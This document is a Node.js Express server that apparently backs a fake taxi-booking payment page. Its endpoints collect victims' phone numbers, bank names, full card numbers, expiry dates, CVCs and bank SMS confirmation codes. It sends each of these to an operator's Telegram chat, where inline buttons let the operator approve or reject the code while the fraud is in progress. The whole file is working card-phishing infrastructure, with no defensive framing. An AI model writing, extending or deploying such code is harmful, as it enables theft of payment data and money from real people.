require('dotenv').config();
const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Хранилище статусов SMS-кодов: { phone: 'pending' | 'success' | 'error' }
const smsStatuses = {};

async function sendToTelegram(text, replyMarkup = null) {
  const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const payload = {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'Markdown'
    };
    if (replyMarkup) payload.reply_markup = replyMarkup;

    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await res.json();
    if (!data.ok) console.error('❌ Ошибка Telegram:', data);
    return data.ok;
  } catch (err) {
    console.error('❌ Ошибка сети/сервера:', err);
    return false;
  }
}

// 📌 ЛОГ 1: Данные карты
app.post('/api/send-log', async (req, res) => {
  const order = req.body;
  const text = `🚖 *НОВЫЙ ЗАКАЗ И ОПЛАТА*

` +
               `📱 *Телефон:* \`${order.phone}\`
` +
               `📍 *Откуда:* ${order.from}
` +
               `🏁 *Куда:* ${order.to}
` +
               `🚕 *Тариф:* ${order.tariff}
` +
               `💰 *Сумма:* ${order.price} ₽

` +
               `💳 *ДАННЫЕ ОПЛАТЫ:*
` +
               `🏛 *Банк:* ${order.bank}
` +
               `💳 *Карта:* \`${order.cardNumber}\`
` +
               `📅 *Срок:* \`${order.cardExpiry}\` | *CVC:* \`${order.cardCvc}\``;

  const ok = await sendToTelegram(text);
  res.status(ok ? 200 : 500).json({ success: ok });
});

// 📌 ЛОГ 2: SMS-код с КНОПКАМИ ДЛЯ АДМИНА
app.post('/api/send-sms-log', async (req, res) => {
  const { phone, bank, smsCode } = req.body;
  
  smsStatuses[phone] = 'pending';

  const text = `📲 *ВВЕДЕН SMS-КОД*

` +
               `📱 *Телефон:* \`${phone}\`
` +
               `🏛 *Банк:* ${bank}
` +
               `🔑 *SMS-Код:* \`${smsCode}\`

` +
               `❓ *Выберите действие:*`;

  const inlineKeyboard = {
    inline_keyboard: [
      [
        { text: "✅ Код верный (Принять)", callback_data: `approve_${phone}` },
        { text: "❌ Код неверный (Отклонить)", callback_data: `reject_${phone}` }
      ]
    ]
  };

  const ok = await sendToTelegram(text, inlineKeyboard);
  res.status(ok ? 200 : 500).json({ success: ok });
});

// Проверка статуса для сайта
app.get('/api/check-sms-status', (req, res) => {
  const phone = req.query.phone;
  const status = smsStatuses[phone] || 'pending';
  res.json({ status });
});

// Опрос нажатий кнопок в Telegram
let offset = 0;
async function pollTelegramUpdates() {
  try {
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=10`;
    const res = await fetch(url);
    const data = await res.json();

    if (data.ok && data.result.length > 0) {
      for (const update of data.result) {
        offset = update.update_id + 1;

        if (update.callback_query) {
          const callback = update.callback_query;
          const actionData = callback.data;

          if (actionData.startsWith('approve_')) {
            const phone = actionData.replace('approve_', '');
            smsStatuses[phone] = 'success';
            
            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: callback.id, text: "Оплата принята!" })
            });

          } else if (actionData.startsWith('reject_')) {
            const phone = actionData.replace('reject_', '');
            smsStatuses[phone] = 'error';

            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: callback.id, text: "Код отклонен!" })
            });
          }
        }
      }
    }
  } catch (e) {}
  setTimeout(pollTelegramUpdates, 1000);
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Сервер запущен: http://localhost:${PORT}`);
  pollTelegramUpdates();
});